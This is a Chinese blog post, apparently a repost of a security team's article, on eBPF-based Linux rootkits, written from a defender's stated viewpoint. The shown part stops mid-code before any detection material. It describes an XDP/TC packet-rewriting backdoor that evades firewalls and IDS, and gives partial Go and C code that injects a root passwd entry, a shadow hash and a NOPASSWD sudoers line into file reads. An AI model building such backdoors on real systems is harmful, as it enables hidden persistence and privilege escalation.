<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Linux中基于eBPF的恶意利用与检测机制 - 大峰哥</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta property="og:title" content="Linux中基于eBPF的恶意利用与检测机制" />
<meta property="og:description" content="前言 近几年，云原生领域飞速发展，K8s成为公认的云操作系统。容器的高频率部署、短暂的生命周期、复杂的网络路由，都给内核安全带来了新的挑战。系统内核面对的复杂性在不断增长，在满足性能、可扩展性等新需求的同时，还需要保障系统稳定可用，这是极其困难的事情。此时，eBPF出现，它以较小的子系统改动，保障了系统内核的稳定，还具备实时动态加载的特性，能将业务逻辑加载到内核，实现热更新的动态执行。
eBPF由BPF发展而来，BPF全称Berkeley Packet Filter，1992年由Steven McCanne和Van Jacobson提出，1997年引入Linux Kernel 2.1，3.0中增加了即时编译器，应用在网络过滤领域。2014年Alexei Starovoitov实现了eBPF并扩展到用户空间，威力更大。常用的TCPDUMP&amp;LIBPCAP就是基于它。在Linux Kernel 4.x中，扩展了内核态函数、用户态函数、跟踪点、性能事件（perf_events）以及安全控制等事件类型。尤其是近几年云原生快速发展，也带动了eBPF的繁荣。微软、Google、Facebook等企业成立eBPF基金会，Cilium公司也发布了基于eBPF技术实现的网络产品。不过，在eBPF技术带动新业务快速发展的同时，也带来了安全威胁。
现状分析 我们可以从一些海外资料和国内资料中可以看到，eBPF在解决很多技术难题的同时，也被很多非法的组织和机构恶意利用。
海外资料 Black Hat
在Black Hat 2021的峰会中，Datadog工程师Guillaume Fournier带来主题为《With Friends Like eBPF, Who Needs Enemies?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://wfsui.github.io/posts/linux%E4%B8%AD%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-03T03:32:45+00:00" />
<meta property="article:modified_time" content="2022-06-03T03:32:45+00:00" /><meta property="og:site_name" content="大峰哥" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Linux中基于eBPF的恶意利用与检测机制"/>
<meta name="twitter:description" content="前言 近几年，云原生领域飞速发展，K8s成为公认的云操作系统。容器的高频率部署、短暂的生命周期、复杂的网络路由，都给内核安全带来了新的挑战。系统内核面对的复杂性在不断增长，在满足性能、可扩展性等新需求的同时，还需要保障系统稳定可用，这是极其困难的事情。此时，eBPF出现，它以较小的子系统改动，保障了系统内核的稳定，还具备实时动态加载的特性，能将业务逻辑加载到内核，实现热更新的动态执行。
eBPF由BPF发展而来，BPF全称Berkeley Packet Filter，1992年由Steven McCanne和Van Jacobson提出，1997年引入Linux Kernel 2.1，3.0中增加了即时编译器，应用在网络过滤领域。2014年Alexei Starovoitov实现了eBPF并扩展到用户空间，威力更大。常用的TCPDUMP&amp;LIBPCAP就是基于它。在Linux Kernel 4.x中，扩展了内核态函数、用户态函数、跟踪点、性能事件（perf_events）以及安全控制等事件类型。尤其是近几年云原生快速发展，也带动了eBPF的繁荣。微软、Google、Facebook等企业成立eBPF基金会，Cilium公司也发布了基于eBPF技术实现的网络产品。不过，在eBPF技术带动新业务快速发展的同时，也带来了安全威胁。
现状分析 我们可以从一些海外资料和国内资料中可以看到，eBPF在解决很多技术难题的同时，也被很多非法的组织和机构恶意利用。
海外资料 Black Hat
在Black Hat 2021的峰会中，Datadog工程师Guillaume Fournier带来主题为《With Friends Like eBPF, Who Needs Enemies?"/>
<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">

	<link rel="stylesheet" type="text/css" media="screen" href="https://wfsui.github.io/css/normalize.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="https://wfsui.github.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://wfsui.github.io/css/dark.css" media="(prefers-color-scheme: dark)" />

	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
	<script src="https://wfsui.github.io/js/main.js"></script>
</head>

<body>
	<div class="container wrapper post">
		<div class="header">
	<base href="https://wfsui.github.io/">
	<h1 class="site-title"><a href="https://wfsui.github.io/">大峰哥</a></h1>
	<div class="site-description"><h2>记录日常生活哦</h2><nav class="nav social">
			<ul class="flat"><a href="https://github.com/wfsui" title="Github"><i data-feather="github"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
		</nav>
	</div>

	<nav class="nav">
		<ul class="flat">
			
			<li>
				<a href="/">首页</a>
			</li>
			
			<li>
				<a href="/posts">文章</a>
			</li>
			
			<li>
				<a href="/about">关于</a>
			</li>
			
			<li>
				<a href="/tags">标签</a>
			</li>
			
		</ul>
	</nav>
</div>


		<div class="post-header">
			<h1 class="title">Linux中基于eBPF的恶意利用与检测机制</h1>
			<div class="meta">Posted at &mdash; Jun 3, 2022</div>
		</div>

		<div class="markdown">
			<h2 id="前言">前言</h2>
<p>近几年，云原生领域飞速发展，K8s成为公认的云操作系统。容器的高频率部署、短暂的生命周期、复杂的网络路由，都给内核安全带来了新的挑战。系统内核面对的复杂性在不断增长，在满足性能、可扩展性等新需求的同时，还需要保障系统稳定可用，这是极其困难的事情。此时，eBPF出现，它以较小的子系统改动，保障了系统内核的稳定，还具备实时动态加载的特性，能将业务逻辑加载到内核，实现热更新的动态执行。</p>
<p>eBPF由BPF发展而来，BPF全称Berkeley Packet Filter，1992年由Steven McCanne和Van Jacobson提出，1997年引入Linux Kernel 2.1，3.0中增加了即时编译器，应用在网络过滤领域。2014年Alexei Starovoitov实现了eBPF并扩展到用户空间，威力更大。常用的TCPDUMP&amp;LIBPCAP就是基于它。在Linux Kernel 4.x中，扩展了内核态函数、用户态函数、跟踪点、性能事件（perf_events）以及安全控制等事件类型。尤其是近几年云原生快速发展，也带动了eBPF的繁荣。微软、Google、Facebook等企业成立eBPF基金会，Cilium公司也发布了基于eBPF技术实现的网络产品。不过，在eBPF技术带动新业务快速发展的同时，也带来了安全威胁。</p>
<h2 id="现状分析">现状分析</h2>
<p>我们可以从一些海外资料和国内资料中可以看到，eBPF在解决很多技术难题的同时，也被很多非法的组织和机构恶意利用。</p>
<h3 id="海外资料">海外资料</h3>
<p><strong>Black Hat</strong></p>
<p>在Black Hat 2021的峰会中，Datadog工程师Guillaume Fournier带来主题为<a href="https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619">《With Friends Like eBPF, Who Needs Enemies?》</a>的分享，他介绍了eBPF如何被恶意利用，包括如何构建一个rootkit、如何利用，并将检测防御代码放在了<a href="https://github.com/Gui774ume/ebpfkit">GitHub</a> 上。</p>
<p><strong>DEFCON</strong></p>
<p>在DEF CON29峰会上，安全研究员Pat Hogan也分享了一些eBPF被恶意利用的案例：<a href="https://defcon.org/html/defcon-29/dc-29-speakers.html#path">《Warping Reality - creating and countering the next generation of Linux rootkits using eBPF》</a> ，这里介绍了eBFP rootkit的应用场景，包括网络、运行时等场景，以及如何检测eBPF被恶意利用等。代码也放在了<a href="https://github.com/pathtofile/bad-bpf">GitHub</a> 上。</p>
<p><img src="https://www.cnxct.com/wp-content/uploads/2022/03/warp-ebpf-detect.jpg" alt=""></p>
<h3 id="国内资料">国内资料</h3>
<p>对比国外，国内eBPF被恶意利用的资料较少，相关技术分享也较少。<strong>可能这方面的危害还没有得到国内安全同行的关注，如果我们继续这样，势必影响到国内公司在网络安全防御体系层面的建设，进而导致安全防护落后于国外，给企业安全甚至国家安全带来较大的风险</strong>。美团信息安全团队作为防御体系的建设方，有责任也有义务带领大家更好地认识这种恶意利用，分享美团在检测防御方面的经验，加固网络安全产品，希望能为国内信息安全建设贡献一份绵薄之力。</p>
<h3 id="ebpf技术恶意利用的攻击原理">eBPF技术恶意利用的攻击原理</h3>
<p>知己知彼，才能百战不殆，要想做好防御，必须要了解它的攻击原理。我们先来看下eBPF的rootkit是如何设计的。从eBPF的功能来看，它提供了以下领域的功能：</p>
<ul>
<li>网络</li>
<li>监控</li>
<li>观测</li>
<li>跟踪&amp;性能分析</li>
<li>安全</li>
</ul>
<p>在<strong>网络</strong>领域，Cilium等云原生公司做了很多网络层的产品，在实现网格管理的同时，也做了相应的网络层面安全策略，尤其是在网络编排领域，表现尤为亮眼，逐步代替<strong>iptables</strong>等产品，大有一统江山的趋势。而在<strong>监控</strong>、<strong>观测</strong>等领域也有很多产品。尤其是运行时安全（Runtime Security）领域，Datadog、Falco、Google等公司也都推出了相应的产品。感兴趣的同学，可以参考相关产品源码分析（<a href="https://mp.weixin.qq.com/s/mnYuIU43T3S4dq-UCZNaqg">Cilium eBPF实现机制源码分析</a>、<a href="https://mp.weixin.qq.com/s/SAPz4Z1m2gVtQWzt68u6eg">Datadog的eBPF安全检测机制分析</a>）的分享。</p>
<p>我们回顾一下eBPF技术的hook点：</p>
<p><img src="https://p0.meituan.net/travelcube/5d1334dbd4bdc0a5c12aeaafcc0297e9478380.png" alt="eBPF hook位置"></p>
<p>从图中可以看出，eBPF的hook点功能包括以下几部分：</p>
<ol>
<li>可以在Storage、Network等与内核交互之间；</li>
<li>也可以在内核中的功能模块交互之间；</li>
<li>又可以在内核态与用户态交互之间；</li>
<li>更可以在用户态进程空间。</li>
</ol>
<p>eBPF的功能覆盖XDP、TC、Probe、Socket等，每个功能点都能实现内核态的篡改行为，从而使得用户态完全致盲，哪怕是基于内核模块的HIDS，一样无法感知到这些行为。</p>
<p>基于eBPF的功能函数，从业务场景来看，网络、监控、观测类的功能促进了云原生领域的产品发展；跟踪/性能分析、安全类功能，加快了安全防御、审计类产品演进；而安全领域的恶意利用，也会成为黑客关注的方向。本文将与大家探讨一下新的威胁与防御思路。</p>
<p><img src="https://p0.meituan.net/travelcube/84f5d8a759c2c45ac519c729d7640687125645.png" alt=""></p>
<p>从数据流所处阶段来看，本文划分为两部分，接下来一起来讨论恶意利用、风险危害与防御思路。</p>
<ol>
<li>Linux网络层恶意利用</li>
<li>Linux系统运行时恶意利用</li>
</ol>
<h3 id="linux网络层恶意利用">Linux网络层恶意利用</h3>
<p>以一个SSH、Web服务的服务器为例，在IDC常见网络访问策略中，开放公网Web 80端口允许任意来源的IP访问。而SSH服务只允许特定IP，或者只开放内网端口访问。</p>
<p>假设这台服务器已经被黑客入侵，黑客需要留下一个后门，且需要一个隐藏、可靠的网络链路作为后门通道，那么在eBPF技术上，会如何实现呢？</p>
<h4 id="xdptc层修改tcp包">XDP/TC层修改TCP包</h4>
<p>为了让后门隐藏的更好，最好是不开进程，不监听端口（当前部分我们只讨论网络层隐藏）。而eBPF技术在XDP、TC、Socket等内核层的功能，能够实现流量信息修改，这些功能常被应用在L3、L4的网络负载均衡上。比如Cilium的网络策略都是基于eBPF XDP实现。eBPF hook了XDP点后，更改了TCP包的目标IP，系统内核再将该数据包转发出去。</p>
<p>按照XDP与TC在Linux内核中，处理ingress与egress的位置，可以更准确地确定hook点。</p>
<p><img src="https://p0.meituan.net/travelcube/060ea32a625a62ce430d72cea0a78ab0346564.png" alt=""></p>
<ul>
<li>XDP的BPF_PROG_TYPE_XDP程序类型，可以丢弃、修改、重传来自ingress的流量，但无法对egress起作用。</li>
<li>TC的BPF_PROG_TYPE_SCHED_CLS除了拥有XDP“BPF_PROG_TYPE_XDP”的功能外，还可以对egress起作用。</li>
</ul>
<p>前者最常用的场景就是做网络防火墙，用于网络流量清洗，效率比传统防火墙的高很多。后者常用于云原生场景下，容器、Pod的网络监控、安全访问控制等。在这个例子中，要对进出流量都做调整，故两个hook点都需要有。同样，在XDP等阶段的hook，在这里做相关包逻辑的处理，能更好地将通信包隐藏，tcpdump等工具都抓不到。</p>
<p><strong>控制链路</strong></p>
<p>在后门场景里，可以在同样的位置，像eBPF的负载均衡一样，修改目标端口，从Web Nginx的80改为SSHD的22，就可以实现网络数据的透传，绕开防火墙以及网络访问限制。</p>
<p><strong>认证密钥</strong></p>
<p>由于后门rootkit是在XDP\TC层工作，为了尽可能的简单，认证密钥最好只使用链路层、网络层、传输层的数据，即MAC信息、IP五元组之类。IP经常变动，MAC地址大概率是唯一的，以及设定一个固定的端口，这样更加唯一，作为rootkit的认证密钥即可实现（需要Client发起连接时，指定客户端的TCP端口）。</p>
<p><strong>eBPF uprobe与eBPF map联动</strong></p>
<p>对于后门rootkit的密钥更新，利用eBPF也很好实现。比如在Nginx的场景中，uprobe实现hook HTTP的函数，获取URL参数中特定字符串，再将字符串保存到eBPF map里，就实现了密钥更新。</p>
<p>XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运算。</p>
<h4 id="实现流程">实现流程</h4>
<p>这里举个XDP处理ingress的例子：</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#268bd2">SEC</span>(<span style="color:#2aa198">&#34;xdp/ingress&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#dc322f">int</span> <span style="color:#268bd2">xdp_ingress</span>(<span style="color:#268bd2">struct</span> xdp_md <span style="color:#719e07">*</span>ctx) {
</span></span><span style="display:flex;"><span><span style="color:#268bd2">struct</span> cursor c;
</span></span><span style="display:flex;"><span><span style="color:#268bd2">struct</span> pkt_ctx_t pkt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">//判断是否为SSHD的协议，不是则直接放行
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#719e07">if</span> (!(不是SSHD协议(<span style="color:#719e07">&amp;</span>c))) {
</span></span><span style="display:flex;"><span><span style="color:#719e07">return</span> XDP_PASS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">//判断rootkit是否匹配，网卡信息与来源端口是否匹配
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>hack_mac[] = <span style="color:#2aa198">&#34;读取bpf map配置。&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#719e07">if</span>(密钥不匹配) {
</span></span><span style="display:flex;"><span><span style="color:#719e07">return</span> XDP_PASS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">// 读取map，是否已经存在该client信息
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#268bd2">struct</span> netinfo client_key = {};
</span></span><span style="display:flex;"><span><span style="color:#268bd2">__builtin_memcpy</span>(<span style="color:#719e07">&amp;</span>client_key.mac, <span style="color:#719e07">&amp;</span>pkt.eth<span style="color:#719e07">-</span>&gt;h_source, ETH_ALEN);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#268bd2">struct</span> netinfo <span style="color:#719e07">*</span>client_value;
</span></span><span style="display:flex;"><span>client_value = <span style="color:#268bd2">bpf_map_lookup_elem</span>(<span style="color:#719e07">&amp;</span>ingress_client, <span style="color:#719e07">&amp;</span>client_key);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">// 如果没找到伪装信息，则自己组装
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#719e07">if</span>(!client_value) {
</span></span><span style="display:flex;"><span><span style="color:#268bd2">__builtin_memset</span>(<span style="color:#719e07">&amp;</span>client_value, <span style="color:#2aa198">0</span>, <span style="color:#268bd2">sizeof</span>(client_value));
</span></span><span style="display:flex;"><span>} <span style="color:#719e07">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#268bd2">bpf_map_update_elem</span>(<span style="color:#719e07">&amp;</span>ingress_client, <span style="color:#719e07">&amp;</span>client_key, <span style="color:#719e07">&amp;</span>client_value, BPF_ANY);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">// 伪装mac局域网mac信息
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>pkt.eth<span style="color:#719e07">-</span>&gt;h_source[<span style="color:#2aa198">0</span>] = <span style="color:#2aa198">0x00</span>;
</span></span><span style="display:flex;"><span><span style="color:#719e07">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">// 替换伪装ip来源 ，客户端端口不变
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">// 更改目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>pkt.tcp<span style="color:#719e07">-</span>&gt;dest = <span style="color:#268bd2">htons</span>(FACK_PORT);    <span style="color:#586e75">//22
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">//计算TCP SUM layer 4
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#268bd2">ipv4_csum</span>(pkt.tcp, <span style="color:#268bd2">sizeof</span>(<span style="color:#268bd2">struct</span> tcphdr), <span style="color:#719e07">&amp;</span>csum);
</span></span><span style="display:flex;"><span>pkt.tcp<span style="color:#719e07">-</span>&gt;check = csum;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">//写入已伪装的map，用于TC处理egress的原mac、IP信息还原。
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#719e07">return</span> XDP_PASS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>比较简单的Demo，即可实现ingress侧TCP数据包的伪装。同样，TC层处理egress方向的数据包时，只需要对伪装包的原始信息作还原即可。整个流程如下图所示：</p>
<p><img src="https://image.cnxct.com/2022/02/ebpf-evil-user-network-1.jpg" alt="eBPF在XDP/TC层实现网络穿透rootkit通信链路"></p>
<p>这样，rootkit的通信链路并不影响正常用户访问，也没有对原系统做改动，隐蔽性特别好。</p>
<h4 id="视频演示">视频演示</h4>
<p>我们准备了三台主机测试：</p>
<ol>
<li>入侵者：cnxct-mt2，IP为172.16.71.1。</li>
<li>普通用户：ubuntu，IP为172.16.71.3。</li>
<li>被入侵服务器：vm-ubuntu，IP为172.16.71.4。开放nginx web 80端口；开放SSHD 22端口，并设定iptables规则只允许内网IP访问。</li>
</ol>
<h4 id="危害">危害</h4>
<p>这个rootkit不主动创建Socket，借用其中一个网络发送包，把消息送达给后门使用者。对系统影响来说，只是一个不起眼的小网络响应。在万千HTTP包里，根本定位不到。</p>
<ol>
<li><strong>iptables防火墙绕过</strong>：利用对外开放的80端口作为通信隧道；</li>
<li><strong>WebIDS绕过</strong>：流量到达服务器后，并不传递给Nginx；</li>
<li><strong>NIDS绕过</strong>：入侵者流量在局域网之间流传并无异常，只是无法解密；</li>
<li><strong>HIDS绕过</strong>：是否信任了防火墙，忽略了本机/局域网来源的SSHD登录。</li>
</ol>
<h3 id="linux系统运行时恶意利用">Linux系统运行时恶意利用</h3>
<p>云原生生态下，涌现大批基于eBPF技术实现的集群网络管理插件，比如Calico、Cilium等。而业务实现网络管理服务是以容器化方式部署，且有需要给这些容器启用SYS_BPF_ADMIN权限以支持eBPF系统调用。这些服务的运行环境，也给攻击者留下一个完美的发挥空间。</p>
<h4 id="实现流程-1">实现流程</h4>
<p>回顾eBPF的hook点，作用在syscall的kprobe、tracepoint事件类型，倘若用在后门rootkit场景，是十分可怕的。比如修改内核态返回给用户态的数据、拦截阻断用户态行为等，为所欲为。而更可怕的是，常见的HIDS都是基于内核态或者用户态做行为监控，eBPF恰恰绕开了大部分HIDS的监控，且不产生任何日志，简直让人“细思极恐、不寒而栗”。</p>
<p><strong>tracepoint事件类型hook</strong></p>
<p>在SSHD应用中，当用户登录时，会读取/etc/passwd等文件。用户态SSHD程序，调用open、read等系统调用，让内核去硬件磁盘上检索数据，再返回数据给SSHD进程。</p>
<p><strong>用户态生成payload</strong></p>
<p>用户态实现/etc/passwd、/etc/shadow等文件payload的生成，并通过eBPF的RewriteConstants机制，完成对ELF .rodata的字段值替换。</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#719e07">import</span> <span style="color:#2aa198">&#34;github.com/ehids/ebpfmanager&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#586e75">//  通过elf的常量替换方式传递数据
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#268bd2">func</span> (e <span style="color:#719e07">*</span>MBPFContainerEscape) <span style="color:#268bd2">constantEditor</span>() []manager.ConstantEditor {
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">var</span> username = <span style="color:#268bd2">RandString</span>(<span style="color:#2aa198">9</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">var</span> password = <span style="color:#268bd2">RandString</span>(<span style="color:#2aa198">9</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">var</span> s = <span style="color:#268bd2">RandString</span>(<span style="color:#2aa198">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	salt <span style="color:#719e07">:=</span> []<span style="color:#b58900">byte</span>(fmt.<span style="color:#268bd2">Sprintf</span>(<span style="color:#2aa198">&#34;$6$%s&#34;</span>, s))
</span></span><span style="display:flex;"><span>	<span style="color:#586e75">// use salt to hash user-supplied password
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>	c <span style="color:#719e07">:=</span> sha512_crypt.<span style="color:#268bd2">New</span>()
</span></span><span style="display:flex;"><span>	hash, err <span style="color:#719e07">:=</span> c.<span style="color:#268bd2">Generate</span>([]<span style="color:#b58900">byte</span>(password), salt)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">var</span> m = <span style="color:#268bd2">map</span>[<span style="color:#dc322f">string</span>]<span style="color:#268bd2">interface</span>{}{}
</span></span><span style="display:flex;"><span>	res <span style="color:#719e07">:=</span> <span style="color:#b58900">make</span>([]<span style="color:#dc322f">byte</span>, PAYLOAD_LEN)
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">var</span> payload = fmt.<span style="color:#268bd2">Sprintf</span>(<span style="color:#2aa198">&#34;%s ALL=(ALL:ALL) NOPASSWD:ALL #&#34;</span>, username)
</span></span><span style="display:flex;"><span>	<span style="color:#b58900">copy</span>(res, payload)
</span></span><span style="display:flex;"><span>	m[<span style="color:#2aa198">&#34;payload&#34;</span>] = res
</span></span><span style="display:flex;"><span>	m[<span style="color:#2aa198">&#34;payload_len&#34;</span>] = <span style="color:#b58900">uint32</span>(<span style="color:#b58900">len</span>(payload))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// 生成passwd字符串
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>	<span style="color:#268bd2">var</span> payload_passwd = fmt.<span style="color:#268bd2">Sprintf</span>(<span style="color:#2aa198">&#34;%s:x:0:0:root:/root:/bin/bash\n&#34;</span>, username)
</span></span><span style="display:flex;"><span>	<span style="color:#586e75">// 生成shadow字符串
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>	<span style="color:#268bd2">var</span> payload_shadow = fmt.<span style="color:#268bd2">Sprintf</span>(<span style="color:#2aa198">&#34;%s:%s:18982:0:99999:7:::\n&#34;</span>, username, hash)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// eBPF RewriteContants
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>    <span style="color:#268bd2">var</span> editor = []manager.ConstantEditor{
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			Name:          <span style="color:#2aa198">&#34;payload&#34;</span>,
</span></span><span style="display:flex;"><span>			Value:         m[<span style="color:#2aa198">&#34;payload&#34;</span>],
</span></span><span style="display:flex;"><span>			FailOnMissing: <span style="color:#cb4b16">true</span>,
</span></span><span style="display:flex;"><span>		},
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			Name:          <span style="color:#2aa198">&#34;payload_len&#34;</span>,
</span></span><span style="display:flex;"><span>			Value:         m[<span style="color:#2aa198">&#34;payload_len&#34;</span>],
</span></span><span style="display:flex;"><span>			FailOnMissing: <span style="color:#cb4b16">true</span>,
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">return</span> editor
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#268bd2">func</span> (this <span style="color:#719e07">*</span>MBPFContainerEscape) <span style="color:#268bd2">setupManagers</span>() {
</span></span><span style="display:flex;"><span>	this.bpfManager = <span style="color:#719e07">&amp;</span>manager.Manager{
</span></span><span style="display:flex;"><span>		Probes: []<span style="color:#719e07">*</span>manager.Probe{
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				Section:          <span style="color:#2aa198">&#34;tracepoint/syscalls/sys_enter_openat&#34;</span>,
</span></span><span style="display:flex;"><span>				EbpfFuncName:     <span style="color:#2aa198">&#34;handle_openat_enter&#34;</span>,
</span></span><span style="display:flex;"><span>				AttachToFuncName: <span style="color:#2aa198">&#34;sys_enter_openat&#34;</span>,
</span></span><span style="display:flex;"><span>			},
</span></span><span style="display:flex;"><span>            <span style="color:#719e07">...</span>
</span></span><span style="display:flex;"><span>		},
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Maps: []<span style="color:#719e07">*</span>manager.Map{
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				Name: <span style="color:#2aa198">&#34;events&#34;</span>,
</span></span><span style="display:flex;"><span>			},
</span></span><span style="display:flex;"><span>		},
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	this.bpfManagerOptions = manager.Options{
</span></span><span style="display:flex;"><span>		<span style="color:#719e07">...</span>
</span></span><span style="display:flex;"><span>		<span style="color:#586e75">// 填充 RewriteContants 对应map
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>		ConstantEditors: this.<span style="color:#268bd2">constantEditor</span>(),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>内核态使用payload</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#719e07">const</span> <span style="color:#719e07">volatile</span> <span style="color:#dc322f">int</span> payload_len <span style="color:#719e07">=</span> <span style="color:#2aa198">0</span>;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#719e07">const</span> <span style="color:#719e07">volatile</span> <span style="color:#dc322f">char</span> payload_shadow[MAX_PAYLOAD_LEN];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SEC(<span style="color:#2aa198">&#34;tracepoint/syscalls/sys_exit_read&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#dc322f">int</span> handle_read_exit(<span style="color:#719e07">struct</span> trace_event_raw_sys_exit <span style="color:#719e07">*</span>ctx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// 判断是否为rootkit行为，是否需要加载payload
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#dc322f">long</span> <span style="color:#dc322f">int</span> read_size <span style="color:#719e07">=</span> ctx<span style="color:#719e07">-&gt;</span>ret;
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// 判断原buff长度是否小于payload
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>    <span style="color:#719e07">if</span> (read_size <span style="color:#719e07">&lt;</span> payload_len) {
</span></span><span style="display:flex;"><span>        <span style="color:#719e07">return</span> <span style="color:#2aa198">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// 判断文件类型，匹配追加相应payload
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>    <span style="color:#719e07">switch</span> (pbuff_addr<span style="color:#719e07">-&gt;</span>file_type)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">case</span> FILE_TYPE_PASSWD:
</span></span><span style="display:flex;"><span>        <span style="color:#586e75">// 覆盖payload到buf，不足部分使用原buff内容
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>        {
</span></span><span style="display:flex;"><span>            bpf_probe_read(<span style="color:#719e07">&amp;</span>local_buff, MAX_PAYLOAD_LEN, (<span style="color:#dc322f">void</span><span style="color:#719e07">*</span>)buff_addr);
</span></span><span style="display:flex;"><span>            <span style="color:#719e07">for</span> (<span style="color:#dc322f">unsigned</span> <span style="color:#dc322f">int</span> i <span style="color:#719e07">=</span> <span style="color:#2aa198">0</span>; i <span style="color:#719e07">&lt;</span> MAX_PAYLOAD_LEN; i<span style="color:#719e07">++</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#719e07">if</span> (i <span style="color:#719e07">&gt;=</span> payload_passwd_len) {
</span></span><span style="display:flex;"><span>                    local_buff[i] <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39; &#39;</span>;
</span></span><span style="display:flex;"><span>                }
